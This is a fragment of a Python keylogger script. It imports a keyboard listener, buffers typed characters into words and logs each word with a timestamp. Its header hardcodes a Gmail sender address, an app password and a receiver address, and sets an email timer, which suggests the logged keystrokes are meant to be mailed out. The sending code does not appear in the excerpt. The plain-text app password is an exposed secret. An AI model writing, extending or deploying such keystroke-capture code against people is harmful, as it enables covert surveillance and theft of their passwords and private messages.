...
SENDER_EMAIL = "11anuragtripathi11@gmail.com"
APP_PASSWORD = "zoug zrug tljk zpvv"
RECEIVER_EMAIL = "11anuragtripathi11@gmail.com"
# ---------------------------------------

running = True
email_timer = None
word_buffer = ""   # ✅ WORD BUFFER

print("Keyboard logger started.")
print("Words will be logged (not single letters).")
...
def on_press(key):
    ...
    try:
        # SPACE or ENTER → save full word
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            if word_buffer.strip():
                log_entry = f"{datetime.now()} - {word_buffer}"
                print(log_entry)
